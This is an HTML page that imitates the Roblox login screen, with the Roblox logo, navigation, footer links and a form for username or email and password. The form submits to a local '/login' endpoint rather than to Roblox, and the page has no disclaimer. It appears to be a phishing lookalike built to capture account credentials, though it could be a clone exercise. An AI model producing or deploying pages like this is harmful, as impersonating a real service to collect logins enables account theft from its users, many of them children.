<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Login to Roblox</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #1c1c1c;
      color: white;
    }

    /* Navbar */
    .navbar {
      background-color: #2f2f2f;
      padding: 12px 20px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .nav-left {
      display: flex;
      align-items: center;
      gap: 30px;
    }

    .nav-left span.logo {
      font-size: 24px;
      font-weight: bold;
      color: white;
    }

    .nav-left a {
      color: white;
      text-decoration: none;
      font-size: 14px;
    }

    .nav-right {
      display: flex;
      align-items: center;
      gap: 15px;
    }

    .nav-right input[type="text"] {
      padding: 5px 10px;
      background: #444;
      border: none;
      border-radius: 4px;
      color: white;
    }

    .nav-right button {
      background-color: #1877f2;
      border: none;
      padding: 6px 12px;
      color: white;
      font-weight: bold;
      border-radius: 4px;
      cursor: pointer;
    }

    /* Main Login Panel */
    .login-section {
      display: flex;
      justify-content: center;
      align-items: center;
      height: calc(100vh - 140px);
    }

    .login-box {
      background-color: #2f2f2f;
      padding: 30px;
      width: 320px;
      border-radius: 8px;
      text-align: center;
    }

    .login-box h2 {
      margin-bottom: 20px;
      color: white;
    }

    .login-box input {
      width: 100%;
      padding: 12px;
      margin-bottom: 12px;
      background-color: #444;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 14px;
    }

    .login-box button {
      width: 100%;
      padding: 12px;
      background-color: #e2231a;
      color: white;
      font-weight: bold;
      border: none;
      border-radius: 6px;
      margin-top: 10px;
      font-size: 15px;
    }

    .login-box .link {
      font-size: 13px;
      color: #ddd;
      margin: 8px 0;
      display: block;
    }

    .login-box .link:hover {
      text-decoration: underline;
    }

    /* Footer */
    footer {
      background-color: #1c1c1c;
      color: #aaa;
      text-align: center;
      padding: 20px 10px;
      font-size: 13px;
    }

    footer a {
      color: #aaa;
      text-decoration: none;
      margin: 0 8px;
    }

    footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <!-- Navbar -->
  <div class="navbar">
    <div class="nav-left">
      <span class="logo">ROBLOX</span>
      <a href="#">Charts</a>
      <a href="#">Marketplace</a>
      <a href="#">Create</a>
      <a href="#">Robux</a>
    </div>
    <div class="nav-right">
      <input type="text" placeholder="Search" />
      <button>Sign Up</button>
    </div>
  </div>

  <!-- Login Box -->
  <div class="login-section">
    <div class="login-box">
      <h2>Login to Roblox</h2>
      <form action="/login" method="post">
        <input type="text" name="username" placeholder="Username/Email/Phone" required />
        <input type="password" name="password" placeholder="Password" required />
        <button type="submit">Log In</button>
      </form>
      <a class="link" href="#">Forgot Password or Username?</a>
      <a class="link" href="#">Email Me a One-Time Code</a>
      <a class="link" href="#">Use Another Device</a>
      <a class="link" href="#">Don't have an account? <b>Sign Up</b></a>
    </div>
  </div>

  <!-- Footer -->
  <footer>
    <a href="#">About Us</a>
    <a href="#">Jobs</a>
    <a href="#">Blog</a>
    <a href="#">Parents</a>
    <a href="#">Gift Cards</a>
    <a href="#">Help</a>
    <a href="#">Terms</a>
    <a href="#">Accessibility</a>
    <a href="#">Privacy</a>
    <a href="#">Your Privacy Choices</a>
  </footer>

</body>
</html>
